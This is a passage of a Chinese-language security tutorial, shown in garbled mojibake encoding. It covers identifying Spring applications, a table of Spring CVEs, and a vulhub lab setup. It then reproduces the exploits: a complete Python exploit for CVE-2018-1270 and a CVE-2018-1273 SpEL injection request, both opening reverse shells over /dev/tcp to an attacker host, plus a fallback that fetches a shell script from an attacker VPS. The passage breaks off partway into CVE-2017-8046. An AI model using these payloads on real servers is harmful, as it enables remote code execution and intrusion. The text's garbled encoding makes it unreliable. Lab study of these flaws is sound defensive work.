#  ä»0è®¤è¯†+è¯†åˆ«+æŒæ¡springå…¨æ¼æ´(1.8wå­—è¶…è¯¦ç»†çœ‹å®Œæ‹¿æspring)æ–‡æœ«å¸¦å·¥å…·

[ å“ˆæ‹‰å°‘å®‰å…¨å°é˜Ÿ ](javascript:void\(0\);)

**å“ˆæ‹‰å°‘å®‰å…¨å°é˜Ÿ** ![]()

å¾®ä¿¡å· gh_b273ce95df95

åŠŸèƒ½ä»‹ç»
ä¸“æ³¨å®‰å…¨æŠ€æœ¯åˆ†äº«ï¼Œæ¶µç›–webæ¸—é€ï¼Œä»£ç å®¡è®¡ï¼Œå†…ç½‘/åŸŸæ¸—é€ï¼Œpoc/expè„šæœ¬å¼€å‘ï¼Œç»å¸¸æ›´æ–°ä¸€äº›æœ€æ–°çš„æ¼æ´å¤ç°ï¼Œæ¼æ´åˆ†ææ–‡ç« ï¼Œå†…ç½‘æ¸—é€æ€è·¯æŠ€å·§ã€è„±æ•çš„å®æˆ˜æ–‡ç« ã€wafç»•è¿‡æŠ€å·§ä»¥åŠå¥½æ–‡æ¨èç­‰ï¼Œæœªæ¥ç€é‡ç‚¹ä¼šåœ¨javaå®‰å…¨ç›¸å…³åˆ†äº«ã€‚

____

___å‘è¡¨äº_

æ”¶å½•äºåˆé›†

ä»¥ä¸‹æ–‡ç« æ¥æºäºéº‹é¹¿å®‰å…¨ ï¼Œä½œè€…éº‹é¹¿

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7KibBbObmlPgfUWHVVKicDLtWumHWXpElxRuIlepzJwO9g/0)
**éº‹é¹¿å®‰å…¨** .

"é¹¿å¾—ç¾è‰ï¼Œå£ç”˜å…¶å‘³ï¼Œåˆ™æ±‚å…¶å‹è€Œå·å…¶ä¾£ä¹Ÿ"ç¾¤å±…çš„éº‹é¹¿äº’ä¸çŒœç–‘ï¼Œæ­£å¦‚æˆ‘ä»¬çš„åˆå¿ƒ--
åŒç”˜å…±è‹¦ï¼Œå…±åŒè¿›æ­¥ã€‚æˆ‘ä»¬æƒ³é€šè¿‡æ­¤å…¬ä¼—å·å»ä¼ æ’­æˆ‘ä»¬æ‰€é—»ä¹‹é“ï¼Œæ‰€æ”»ä¹‹ä¸šï¼Œå¸Œæœ›èƒ½å¸®åŠ©æ›´å¤šçš„äººäº†è§£ç½‘ç»œå®‰å…¨ä»¥åŠæå‡è‡ªå·±çš„æŠ€æœ¯ã€‚æˆ‘ä»¬çš„è¿½æ±‚ï¼šä½è°ƒè°¦è™š äº’å¸®äº’åŠ©
ä¸€ç›´è¿›æ­¥

æ­£å¦‚å„ä½è¯»è€…æ‰€è§,æˆ‘ä»¬æ–°å¼€äº†ä¸€ä¸ªä¸»é¢˜: **ç»å…¸æ¼æ´å¤ç°** ,å’Œå…¶ä»–æ–‡ç« ä¸ä¸€æ ·ä¹‹å¤„åœ¨äº--
æˆ‘ä»¬ä¼šè¯¦ç»†ä»‹ç»æ¼æ´åŸç†+æ¼æ´æŒ‡çº¹ç‰¹å¾+è¯¦ç»†çš„åˆ©ç”¨(å¤ç°)è¿‡ç¨‹,åœ¨è¿™ä¸ªç³»åˆ—é‡Œæˆ‘ä»¬å¸Œæœ›èƒ½å¸¦ç€è¯»è€…(å°ç™½)å»è®¤è¯†å¹¶æŒæ¡æ¯ä¸€ä¸ªæ¼æ´,å°±æ‹¿ä»Šå¤©çš„springæ¡†æ¶æ¥è¯´,æˆ‘ä»¬ç›¸ä¿¡å°ç™½è¯»å®Œè¿™ç¯‡æ–‡ç« ä»¥å,ä»¥ååœ¨å®æˆ˜é‡Œå¯ä»¥å¿«é€Ÿè¯†åˆ«å‡ºæ¥springæ¡†æ¶å¹¶ç†Ÿæ‚‰å¯èƒ½ä¼šå‡ºç°çš„æ¼æ´åŠç›¸åº”çš„æ‰“æ³•

 **æœ¬æ–‡ç›®å½•**

æ¡†æ¶ä»‹ç»  
| ä½•ä¸ºspring,åœ¨å“ªä¼šé‡åˆ°spring  
  
---|---  
è¯†åˆ«spring  
| å¦‚ä½•åœ¨å®æˆ˜ä¸­å¿«é€Ÿåˆ†è¾¨springæ¡†æ¶  
  
æ¼æ´åˆ—è¡¨  
| springæ¼æ´å…¨ç‰ˆæœ¬  
  
æ¼æ´ç¯å¢ƒæ­å»º  
| vulhub+vulfocus  
  
æ¼æ´å¤ç°  
| 1.å¦‚ä½•è¯†åˆ«å½“å‰ç«™ç‚¹æ˜¯å¦å­˜åœ¨æ¼æ´  
  
| 2.å“ªäº›ç‰ˆæœ¬(æƒ…å†µ)å­˜åœ¨è¯¥æ¼æ´  
  
  
| 3.æ¼æ´æŒ‡çº¹ç‰¹å¾â­  
  
  
| 4.å¦‚ä½•å¤ç°  
  
  
| 5.å¦‚ä½•å®ç°è‡ªåŠ¨åŒ–  
  
å·¥å…·  
| 1.æŒ‡çº¹è¯†åˆ«å·¥å…·  
  
  
|

2.ç»¼åˆåˆ©ç”¨å·¥å…·  
  
  

 **é›¶-ä»€ä¹ˆæ˜¯spring**  

Spring æ¡†æ¶æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ Java
åº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œæ—¨åœ¨æä¾›é«˜æ•ˆä¸”å¯æ‰©å±•çš„å¼€å‘ç¯å¢ƒã€‚å…¶æœ¬èº«ä¹Ÿæ˜¯æ¨¡å—åŒ–çš„ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é€‰æ‹©æ‰€éœ€è¦çš„æ¨¡å—ã€‚è¿™äº›æ¨¡å—ç¼©çŸ­åº”ç”¨ç¨‹åºçš„å¼€å‘æ—¶é—´ï¼Œæé«˜äº†åº”ç”¨å¼€å‘çš„æ•ˆç‡ä¾‹å¦‚ï¼Œåœ¨Java
Webå¼€å‘çš„æ—© æœŸé˜¶æ®µï¼Œç¨‹åºå‘˜éœ€è¦ç¼–å†™å¤§é‡çš„ä»£ç æ¥å°†è®°å½•æ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚ä½†æ˜¯é€šè¿‡ä½¿ç”¨Spring JDBCæ¨¡å—çš„
JDBCTemplateï¼Œæˆ‘ä»¬å¯ä»¥å°†æ“ä½œç®€åŒ–ä¸ºå‡ è¡Œä»£ç ï¼Œæ‰€ä»¥springåº”ç”¨ååˆ†å¹¿æ³›ï¼Œæ¼æ´è¾ƒä¸ºå¸¸è§ï¼Œå¿…é¡»æŒæ¡ã€‚springæœ‰äº”ä¸ªéå¸¸å…³é”®çš„éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯
Spring framework ã€springboot ã€spring cloud ã€spring secutiryã€spring
mvc,å…¶ä¸­çš„spring framework å°±æ˜¯å¤§å®¶ç»å¸¸æåˆ°çš„spring,æ˜¯æ‰€æœ‰springå†…å®¹æœ€åŸºæœ¬çš„åº•å±‚æ¶æ„,å…¶ä¸­åŒ…å«spring
mvcï¼Œspringbootï¼ŒIOCå’ŒAOPç­‰ç­‰ã€‚Spring
mvcå°±æ˜¯springä¸­çš„ä¸€ä¸ªMVCæ¡†æ¶ï¼Œä¸»è¦ç”¨æ¥å¼€å‘webåº”ç”¨å’Œç½‘ç»œæ¥å£ï¼Œä½†æ˜¯å…¶ä½¿ç”¨ä¹‹å‰éœ€è¦é…ç½®å¤§é‡çš„xmlæ–‡ä»¶ï¼Œæ¯”è¾ƒç¹çï¼Œæ‰€ä»¥å‡ºç°äº†springbootï¼Œå…¶å†…ç½®tomcatå¹¶ä¸”å†…ç½®é»˜è®¤çš„XMLé…ç½®ä¿¡æ¯ï¼Œä»è€Œæ–¹ä¾¿äº†ç”¨æˆ·çš„ä½¿ç”¨ï¼Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹ã€‚

![]()

 **ä¸€-å¦‚ä½•è¯†åˆ«spring**  
1.iocå›¾æ ‡

![]()

![]()

2.é»˜è®¤æŠ¥é”™çš„é¡µé¢

  

![]()

è¿™é‡Œmiluè¿™ä¸ªæ–‡ä»¶è‚¯å®šæ˜¯ä¸å­˜åœ¨çš„ **  
**

3.å¸¸è§ç«¯ç‚¹  

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     /autoconfig æä¾›äº†ä¸€ä»½è‡ªåŠ¨é…ç½®æŠ¥å‘Šï¼Œè®°å½•å“ªæ­¤è‡ªåŠ¨é…ç½®æ¡ä»¶é€šè¿‡äº†ï¼Œå“ªäº›æ²¡é€šè¿‡/contigprops æè¿°é…ç½®å±æ€§ (åŒ…å«é»˜è®¤å€¼) å¦‚ä½•æ³¨å…¥ Bean/beans æè¿°åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡é‡Œå…¨éƒ¨çš„ Beanï¼Œä»¥åŠå®ƒä»¬çš„å…³ç³»/dump è·å–çº¿ç¨‹æ´»åŠ¨çš„å¿«ç…§ (å¸¸è§ï¼‰/env è·å–å…¨éƒ¨ç¯å¢ƒå±æ€§ ï¼ˆå¸¸è§ï¼‰/env/(name) æ ¹æ®åç§°è·å–ç‰¹å®šçš„ç¯å¢ƒå±æ€§å€¼/health æŠ¥å‘Šåº”ç”¨ç¨‹åºçš„å¥åº·æŒ‡æ ‡ï¼Œè¿™äº›å€¼ç”± Healthlndicator çš„å®ç°ç±»æä¾› ï¼ˆå¸¸è§ï¼‰/info è·å–åº”ç”¨ç¨‹åºçš„å®šåˆ¶ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ç”± info æ‰“å¤´çš„å±æ€§æä¾›mappings æè¿°å…¨éƒ¨çš„ URI è·¯å¾„ï¼Œä»¥åŠå®ƒä»¬å’Œæ§åˆ¶å™¨ (åŒ…å« Actuator ç«¯ç‚¹)çš„æ˜ å°„å…³ç³»/metrics æŠ¥å‘Šå„ç§åº”ç”¨ç¨‹åºåº¦é‡ä¿¡æ¯ï¼Œæ¯”å¦‚å†…å­˜ç”¨é‡å’Œ HTTP è¯·æ±‚è®¡æ•°/metrics/(name) æŠ¥å‘ŠæŒ‡å®šåç§°çš„åº”ç”¨ç¨‹åºåº¦é‡å€¼/shutdown å…³é—­åº”ç”¨ç¨‹åºï¼Œè¦æ±‚ endpoints.shutdown.enabled è®¾ç½®ä¸º true (é»˜è®¤ä¸º false)/trace æä¾›åŸºæœ¬çš„ HTTP è¯·æ±‚è·Ÿè¸ªä¿¡æ¯ (æ—¶é—´æˆªã€HTTP å¤´ç­‰)

1.xç‰ˆæœ¬ï¼šhttp://ip:port/env  
2.xç‰ˆæœ¬ï¼šhttp://ip:port/actuator/env

ä¾‹å¦‚

![]()

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    /actuator/auditevents/autoconfig/beans/caches/conditions/configprops/docs/dump/env/flyway/health/heapdump/httptrace/info/intergrationgraph/jolokia/logfile/loggers/liquibase/metrics/mappings/prometheus/refresh/scheduledtasks/sessions/shutdown/trace/threaddump/actuator/auditevents/actuator/beans/actuator/health/actuator/conditions/actuator/configprops/actuator/env/actuator/info/actuator/loggers/actuator/heapdump/actuator/threaddump/actuator/metrics/actuator/scheduledtasks/actuator/httptrace/actuator/mappings/actuator/jolokia/actuator/hystrix.stream

ä¸Šé¢çš„å¸¸è§ç›®å½•å¯ä»¥fuzz

4.wappalyzeræ’ä»¶è¯†åˆ«

![]()

5.å“åº”æ ‡å¤´æœ‰X-Application-Contextå­—æ ·

å¦‚

![]()

å¦‚æœå¼€å‘è€…è®¾ç½®å¦‚ä¸‹,è¿™ä¸ªç‰¹å¾å°±ä¼šæ¶ˆé™¤

`management.add-application-context-header: false`

 **3.springè·¯ç”±å’Œç‰ˆæœ¬çŸ¥è¯†**

 **ä½•ä¸ºè·¯ç”±**

  * æœ‰äº›ç¨‹åºå‘˜ä¼šè‡ªå®šä¹‰ `/manager` ã€ /management ã€é¡¹ç›®Appç›¸å…³åç§°ä¸º spring ç›¸å…³ åç§°ä¸ºspring æ ¹è·¯å¾„

  * Spring Boot Actuator 1.x ç‰ˆæœ¬é»˜è®¤å†…ç½®è·¯ç”±çš„èµ·å§‹è·¯å¾„ä¸º / ï¼Œ2.x ç‰ˆæœ¬åˆ™ç»Ÿä¸€ä»¥ /actuator ä¸ºèµ·å§‹è·¯å¾„

  * Spring Boot Actuator é»˜è®¤çš„å†…ç½®è·¯ç”±åå­—ï¼Œå¦‚/env ï¼Œæœ‰æ—¶ä¹Ÿä¼šè¢«ä¿®æ”¹ï¼Œæ¯”å¦‚/appenv

 **è¿™é‡Œä¼šæ¶‰åŠåˆ°åé¢çš„s** **pringboot actuatoræœªæˆæƒè®¿é—®**

 **ç‰ˆæœ¬çŸ¥è¯†**

è¯´æ˜ï¼šSpring Cloud æ˜¯åŸºäº Spring Boot
æ¥è¿›è¡Œæ„å»ºæœåŠ¡ï¼Œå¹¶æä¾›å¦‚é…ç½®ç®¡ç†ã€æœåŠ¡æ³¨å†Œä¸å‘ç°ã€æ™ºèƒ½è·¯ç”±ç­‰å¸¸è§åŠŸèƒ½çš„å¸®åŠ©å¿«é€Ÿå¼€å‘åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç³»åˆ—æ¡†æ¶çš„æœ‰åºé›†åˆã€‚

Spring Cloud å¤§ç‰ˆæœ¬| Spring Boot ç‰ˆæœ¬  
---|---  
Angel| å…¼å®¹ Spring Boot 1.2.x  
Brixton| å…¼å®¹ Spring Boot 1.3.xã€1.4.x  
Camden| å…¼å®¹ Spring Boot 1.4.xã€1.5.x  
Dalston| å…¼å®¹ Spring Boot 1.5.xã€ä¸å…¼å®¹ 2.0.x  
Edgware| å…¼å®¹ Spring Boot 1.5.xã€ä¸å…¼å®¹ 2.0.x  
Finchley| å…¼å®¹ Spring Boot 2.0.xã€ä¸å…¼å®¹ 1.5.x  
Greenwich| å…¼å®¹ Spring Boot 2.1.x  
Hoxton| å…¼å®¹ Spring Boot 2.2.x  
  
Spring Cloud å°ç‰ˆæœ¬å·çš„åç¼€åŠå«ä¹‰

  

å°ç‰ˆæœ¬å·åç¼€| å«ä¹‰  
---|---  
BUILD-SNAPSHOT| å¿«ç…§ç‰ˆï¼Œä»£ç ä¸æ˜¯å›ºå®šï¼Œå¤„äºå˜åŒ–ä¹‹ä¸­  
MX| é‡Œç¨‹ç¢‘ç‰ˆ  
RCX| å€™é€‰å‘å¸ƒç‰ˆ  
RELEASE| æ­£å¼å‘å¸ƒç‰ˆ  
SRX| ä¿®å¤é”™è¯¯å’ŒBUGå¹¶å†æ¬¡å‘å¸ƒçš„æ­£å¼ç‰ˆ  
  
  

 **äºŒ-æ¼æ´åˆ—è¡¨**

  

å¤ç°é¡ºåº| æ¼æ´åç§°| æ¼æ´ID| å½±å“ç‰ˆæœ¬  
---|---|---|---  
1  
| Spring Websocket RCE| CVE-2018-1270| Spring Framework 4.3-4.3.15  
Spring Framework 5.0-5.0.5  
2| Spring Data RCE| CVE-2018-1273| SPring Data Common 1.13-1.13.10  
Spring Data REST 2.6-2.6.10  
Spring Commons 2.0-2.0.5  
Spring Data REST 3.0-3.0.5  
3  
| Spring Data REST RCE| CVE-2017-8046| Spring Data REST < 3.0.1 and Spring
Boot versions < 1.5.9  
Spring Data REST < 2.6.9 and Spring Boot < 1.5.9  
4| Spring Web Flow RCE| CVE-2017-4971| Spring Web Flow 2.4.0-2.4.4  
Spring Web Flow 2.4.4-2.4.8  
5  
| Spring Security OAuth2 RCE| CVE-2016-4977| Spring Security OAuth 2.0-2.0.0  
Spring Security OAuth 1.0-1.0.5  
6| Spring Boot ç›®å½•éå†| CVE-2021-21234| Spring boot < 0.2.13  
7  
| Spring Data MongoDB SpEL Expression injection| CVE-2022-22980| Spring Data
MongoDB == 3.4.0  
3.3.0 <= Spring Data MongoDB <= 3.3.4  
8  
| Spring Framework RCE| CVE-2022-22965| jdk9+ and  
SpringåŠå…¶è¡ç”Ÿæ¡†æ¶ and  
ä½¿ç”¨tomcatéƒ¨ç½²springé¡¹ç›® and  
ä½¿ç”¨äº†POJOå‚æ•°ç»‘å®š and  
Spring Framework 5.3.x - 5.3.18 or  
Spring Framework 2.x - 5.2.20  
9  
| Spring Cloud Function RCE| CVE-2022-22963| 3.0.0.RELEASE <= Spring Cloud
Function <= 3.2.2  
10| Spring Cloud Gateway RCE| CVE-2022-22947| Spring Cloud Gateway 3.1.0  
Spring Cloud Gateway 3.0.0 - 3.0.6  
è€ç‰ˆSpring Cloud Gateway ä¹Ÿå¯èƒ½å­˜åœ¨  
11  
| Spring Actuator æœªæˆæƒè®¿é—®| None| None  
12  
| è·å–æ˜Ÿå·ä¿¡æ¯| None| None  
13  
| whitelabel error page SpEL RCE| None| None  
14  
| mysql jdbc deserialization RCE| None| None  
  
  

 **ä¸‰-æ­å»ºæ¼æ´ç¯å¢ƒ(docker+vulhub)**

æˆ‘ä»¬é‡‡ç”¨vulhubåšä¸ºé¶åœº,ç¬¬ä¸€æ­¥ä»‹ç»å¦‚ä½•åœ¨kaliå®‰è£…docker  

æ¢é˜¿é‡Œäº‘æº  

  * 

    
    
    vim /etc/apt/sources.list

  

å°†å…¶ä¹‹å‰çš„ç¨‹åºå…¨éƒ¨æ³¨é‡Š#

  *   *   *   * 

    
    
    deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse

å®‰è£…å…¬é’¥

  *   *   * 

    
    
    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5  
    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32

æ›´æ–°æº

  * 

    
    
    apt-get update

å®‰è£…httpsåè®®ã€CAè¯ä¹¦

  * 

    
    
    apt-get install -y apt-transport-https ca-certificates

å®‰è£…docker  

  * 

    
    
    apt install docker.io

æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ  

  *   *   * 

    
    
     docker -v systemctl start docker docker ps -a

![]()

## å®‰è£…pip

  * 

    
    
    apt-get install python3-pip

## å®‰è£…docker-compose

  * 

    
    
    pip3 install docker-compose

æŸ¥çœ‹docker-composeç‰ˆæœ¬

  * 

    
    
    docker-compose -v

 **å®‰è£…vulhub**

 **git clone https://github.com/vulhub/vulhub.git** è¿™ä¸ªå¤ªæ…¢äº†

å»ºè®®ç”¨ä¸‹é¢è¿™æ¡  

  * 

    
    
    git clone https://gitclone.com/github.com/vulhub/vulhub

æŠ½æ ¹çƒŸçš„åŠŸå¤«å°±ä¸‹å¥½äº†

![]()

è¿›å…¥åˆ°vulhubç›®å½•,lsä¸€ä¸‹

![]()

 **å¯åŠ¨ç¯å¢ƒ**

è¿›å…¥è¦è”ç³»çš„å¯¹åº”æ¼æ´,ä¾‹å¦‚CVE-2016-4977 **  
**

![]()

  *   *   *   *   *   * 

    
    
    å¯åŠ¨ç¯å¢ƒ docker-compose build  docker-compose up -dæŸ¥çœ‹ç¯å¢ƒ  
    docker-compose ps

``

![]()

è®¿é—®ç¯å¢ƒ  

![]()

å¤ç°å®Œä»¥å,å…³é—­ç¯å¢ƒ  

  * 

    
    
    â€docker-compose down

  

 **ä¸‰-å¤ç°æ¼æ´**

 **1. **Spring Websocket RCE ( **CVE-2018-1270)******

 **1.1æ¼æ´ç®€ä»‹** è¯´æ˜ï¼šä¿®æ”¹å‰ç«¯jsæºç ï¼Œæ·»åŠ æ¶æ„RCE headerï¼ˆå®Œå…¨å¯æ§ï¼Œåˆ©ç”¨ç®€å•ï¼‰å½±å“èŒƒå›´å¦‚â¬‡ï¸ï¼šSpring Framework 4.3
- 4.3.15Spring Framework 5.0 - 5.0.5æ¦‚è¿°ï¼šç‰ˆæœ¬èŒƒå›´å†…çš„Spring Frameword å…è®¸åº”ç”¨ç¨‹åºé€šè¿‡ Spring-
messagingæ¨¡å—å†…å­˜ä¸­STOMPä»£ç†åˆ›å»ºWebSocketï¼Œæ”»å‡»è€…å¯ä»¥å‘ä»£ç†å‘é€æ¶ˆæ¯ï¼Œä»è€Œå¯¼è‡´RCE

å¯åŠ¨

![]()

æ¼æ´æŒ‡çº¹  

    
    
    è®¿é—®/gs-guide-websocket

é¶åœºå¦‚ä¸‹  

![]()

#

![]()

#  **1.2å¤ç°**

æ ¹æ®æŒ‡çº¹ä¿¡æ¯å¯çŸ¥å­˜åœ¨CVE-2018-1270 **  
**

 **1.3exp**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     #!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport json  
    logging.basicConfig(stream=sys.stdout, level=logging.INFO)  
    def random_str(length):    letters = string.ascii_lowercase + string.digits    return ''.join(random.choice(letters) for c in range(length))  
      
    class SockJS(threading.Thread):    def __init__(self, url, *args, **kwargs):        super().__init__(*args, **kwargs)        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'        self.daemon = True        self.session = requests.session()        self.session.headers = {            'Referer': url,            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'        }        self.t = int(time.time()*1000)  
        def run(self):        url = f'{self.base}/htmlfile?c=_jp.vulhub'        response = self.session.get(url, stream=True)        for line in response.iter_lines():            time.sleep(0.5)  
        def send(self, command, headers, body=''):        data = [command.upper(), '\n']  
            data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))  
            data.append('\n\n')        data.append(body)        data.append('\x00')        data = json.dumps([''.join(data)])  
            response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)        if response.status_code != 204:            logging.info(f"send '{command}' data error.")        else:            logging.info(f"send '{command}' data success.")  
        def __del__(self):        self.session.close()  
      
    sockjs = SockJS('http://é¶æœºIP:8080/gs-guide-websocket')sockjs.start()time.sleep(1)  
    sockjs.send('connect', {    'accept-version': '1.1,1.0',    'heart-beat': '10000,10000'})sockjs.send('subscribe', {    'selector': 'T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ä½ çš„kaliIP/kaliç›‘å¬ç«¯å£;cat <&5 | while read line; do $line 2>&5 >&5; done"})',    'id': 'sub-0',    'destination': '/topic/greetings'})  
    data = json.dumps({'name': 'vulhub'})sockjs.send('send', {    'content-length': len(data),    'destination': '/app/hello'}, data)  
    

kaliè¿™é‡Œ

  * 

    
    
    nc -lnvp 5555

æ‰§è¡Œexp

![]()

æ¥äº†

![]()

#

#  **2.Spring Data RCE(CVE-2018-1273)**

 **1.1æ¼æ´ä»‹ç»**

è¯´æ˜ï¼šSpring Data
æ˜¯ä¸€ä¸ªç”¨äºç®€åŒ–æ•°æ®åº“è®¿é—®ï¼Œå¹¶æ”¯æŒäº‘æœåŠ¡çš„å¼€æºæ¡†æ¶ï¼ŒåŒ…å«Commonsã€Gemfireã€JPAã€JDBCã€MongoDBç­‰æ¨¡å—ã€‚æ­¤æ¼æ´äº§ç”ŸäºSpring
Data Commons
2.0.5åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼Œè¯¥ç»„ä»¶ä¸ºæä¾›å…±äº«ç­‰åŸºç¡€æ¡†æ¶ï¼Œé€‚åˆå„ä¸ªå­é¡¹ç›®ä½¿ç”¨ï¼Œæ”¯æŒè·¨æ•°æ®åº“æŒä¹…åŒ–ã€‚åŸç†æ˜¯åœ¨ä¸€å¤„SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„SpELè¡¨è¾¾å¼ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚Spring
DAta Commons ç»„ä»¶ä¸­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯æ„é€ åŒ…å«æœ‰æ¶æ„ä»£ç çš„SPELè¡¨è¾¾å¼ï¼Œå®ç°è¿œç¨‹ä»£ç æ”»å‡»ã€‚å½±å“èŒƒå›´å¦‚â¬‡ï¸ï¼šSpring Data
Commons 1.13 - 1.13.10 (Ingalls SR10) Spring Data REST 2.6 - 2.6.10 (Ingalls
SR10) Spring Data Commons 2.0 to 2.0.5 (Kay SR5) Spring Data REST 3.0 - 3.0.5
(Kay SR5)

 **1.2æ¼æ´æŒ‡çº¹**

æ— æ˜æ˜¾æŒ‡çº¹,å¯èƒ½å­˜åœ¨springæ¡†æ¶å’Œæ•°æ®åº“äº¤äº’çš„åœ°æ–¹(ä¾‹å¦‚è¡¨å•)

è¿™é‡Œvulhubé¶åœºé•¿è¿™æ ·  

![]()

å…ˆæ‰«ä¸€ä¸‹ç›®å½•

![]()

è®¿é—®usersç›®å½• **  
**

![]()

  

 **1.3exp**

åœ¨è¡¨å•å“ªé‡Œéšä¾¿è¾“ç‚¹,å¦‚ä½•æŠ“åŒ…,æ”¹æˆå¦‚ä¸‹ **  
**

![]()

  *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /users?page= &size=5 HTTP/1.1Host: 192.168.233.131:8080User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 50Origin: http://192.168.233.131:8080Connection: closeReferer: http://192.168.233.131:8080/users?page=6&size=5Upgrade-Insecure-Requests: 1  
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("å‘½ä»¤")]=&password=&repeatedPassword=

â€

è¿™é‡Œç”¨ä¸€ä¸‹dnslog

![]()

![]()

 **1.4getshell**

  * 

    
    
     bash$IFS$9-i>&/dev/tcp/192.168.233.131/6666 0>&1

å…ˆå¯¹è¿™æ¡å‘½ä»¤bashç¼–ç 

è¿™é‡Œæœ‰ä¸ªå‘, Java Runtime.exe() æ‰§è¡Œå‘½ä»¤ä¸åå¼¹shell
è¦è¿›è¡Œç¼–ç ï¼Œjavaç®¡é“ç¬¦æ— æ•ˆçš„åŸå› æ— æ³•åå¼¹ï¼Œè€Œä¸”è¦ä½¿ç”¨IFSå†…éƒ¨åŸŸåˆ†éš”ç¬¦ï¼Œå¯¹ç©ºç™½å¤„è¿›è¡Œå¡«å……ï¼Œä¸ç„¶ä¹Ÿæ˜¯åå¼¹ä¸å›æ¥çš„ï¼š

![]()

ç„¶åæ‹¼æ¥

![]()

  * 

    
    
    username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {echo,YmFzaCRJRlMkOS1pPiYvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNjY2NjwmMSA=}|{base64 -d}|{bash -i}")]=&password=&repeatedPassword=

â€

å¦‚æœè¿™é‡Œgetshellå¤±è´¥,é‚£å°±åœ¨è‡ªå·±æœåŠ¡å™¨æ”¾ä¸€ä¸ªshellè„šæœ¬,è®©å—å®³æœºå»è®¿é—®è¿™ä¸ªurl

  *   *   * 

    
    
    bash-i>&/dev/tcp/XXXXXX/port 0>&1è®¿é—®shåœ°å€wget http://å·¥å…·äººvpsåœ°å€/reshell.sh

å·¥å…·äººvpsä¸Š

  *   * 

    
    
    # å¼€å¯httpæœåŠ¡python3 -m http.server 8080

â€

è®¿é—®shellåœ°å€(å·¥å…·äººvpsåœ°å€)  

![]()

![]()

è¿è¡Œshell

bash /tmp/shell.sh![]()

okä¸‹ä¸€ä¸ª

 **3.Spring Data REST RCE(CVE-2017-8046)**

 **3.1æ¼æ´ä»‹ç»** **  
**

Spring-data-restæœåŠ¡å™¨åœ¨å¤„ç†PATCHè¯·æ±‚æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PATCHè¯·æ±‚å¹¶å‘é€ç»™spring-date-
restæœåŠ¡å™¨ï¼Œé€šè¿‡æ„é€ å¥½çš„JSONæ•°æ®æ¥æ‰§è¡Œä»»æ„Javaä»£ç 

å½±å“ç‰ˆæœ¬ï¼š

Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3

Spring Boot version < 2.0.0M4

Spring Data release trains < Kay-RC3

 **3.2æ¼æ´æŒ‡çº¹**

![]()

çœ‹åˆ° jsonæ ¼å¼çš„è¿”å›å€¼ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ª Restfulé£æ ¼çš„APIæœåŠ¡å™¨

 **ç†è§£ä»€ä¹ˆæ˜¯restful**

